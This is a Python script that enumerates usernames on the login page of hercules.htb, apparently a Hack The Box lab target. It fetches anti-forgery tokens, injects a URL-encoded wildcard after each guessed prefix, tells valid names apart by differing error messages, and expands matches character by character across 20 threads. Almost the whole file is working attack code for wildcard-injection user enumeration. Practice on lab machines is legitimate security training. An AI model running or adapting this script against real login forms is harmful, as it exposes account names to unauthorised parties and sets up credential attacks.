import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from colorama import Fore, Style

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789._-$"
URL = "https://hercules.htb/login"

# Disable SSL warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

set_lock = threading.Lock()
THREADS = 20
DELAY = 2

def log(mode, msg):
    match mode:
        case "success":
            print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
        case "error":
            print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
        case "info":
            print(Fore.BLUE + f"[*] {msg}" + Style.RESET_ALL)
        case "warning":
            print(Fore.YELLOW + f"[!] {msg}" + Style.RESET_ALL)

def get_tokens():
    try:
        r = requests.get(URL, verify=False)
        #print(r.headers['Set-Cookie'][27:-18])
        if 'Set-Cookie' in r.headers:
            cookie = r.headers['Set-Cookie'][27:-18]
            
            soup = BeautifulSoup(r.text, 'html.parser')
            token = soup.find_all("input")[0]['value']
            return (cookie, token)
        else:
            log("error", "FATAL ERROR!")
            log("error", "Failed to obtain request tokens.")
            exit(0)
    except requests.RequestException as e:
        log("error", "FATAL ERROR!")
        log("error", f"get_tokens(): {e}")
        exit(0)

def is_valid(username):
    base_delay = 0
    while True:
        (cookie, token) = get_tokens()
        cookies = {
            "__RequestVerificationToken": cookie
        }
        data = {
            "__RequestVerificationToken": token,
            "Username": username,
            "Password": "test",
            "RememberMe": "false"
        }

        try:
            r = requests.post(URL, cookies=cookies, data=data, verify=False)
            if r.status_code != 200:
                log("error", "FATAL ERROR!")
                log("error", f"Unexpected status code received: {r.status_code}.")
                log("error", f"Response text: {r.text}")
                exit(0)
            
            if "Login attempt failed" in r.text:
                return True
            elif "Invalid login attempt" in r.text:
                return False
            else:
                base_delay += DELAY
                log("warning", f"Empty response received for {username}, retrying after {base_delay} seconds.")
                time.sleep(base_delay)
                continue
        except requests.RequestException as e:
            log("error", "FATAL ERROR!")
            log("error", f"is_valid({username}): {e}")
            exit(0)

def main():
    usernames = set()
    valid_expressions = set()

    log("info", f"Starting multi-threaded brute force with {THREADS} threads...")

    log("info", f"Testing {len(CHARSET)} initial characters...")
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(is_valid, c + "%2a") for c in CHARSET]
        for i, future in enumerate(futures):
            if future.result():
                with set_lock:
                    log("info", f"Valid expression found: {CHARSET[i]}*")
                    valid_expressions.add(CHARSET[i])
    
    while valid_expressions:
        with set_lock:
            batch = set()
            while valid_expressions and len(batch) < THREADS:
                batch.add(valid_expressions.pop())
        
        if not batch:
            log("warning", "Empty batch.")
            break
        
        log("info", f"Processing batch of {len(batch)} expressions...")
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            def test_expression(exp):
                if is_valid(exp):
                    log("success", f"USERNAME FOUND: {exp}")
                    with set_lock:
                        usernames.add(exp)
                
                with ThreadPoolExecutor(max_workers=THREADS) as executor:
                    futures = [executor.submit(is_valid, exp + c + "%2a") for c in CHARSET]
                    for i, future in enumerate(futures):
                        if future.result():
                            log("info", f"Valid expression found: {exp + CHARSET[i]}*")
                            with set_lock:
                                valid_expressions.add(exp + CHARSET[i])
            
            futures = [executor.submit(test_expression, exp) for exp in batch]
            for future in futures:
                future.result()
    
    log("success", f"Brute force completed. {len(usernames)} usernames found:")
    for user in sorted(usernames):
        print(user)

    return

if __name__ == "__main__":
    main()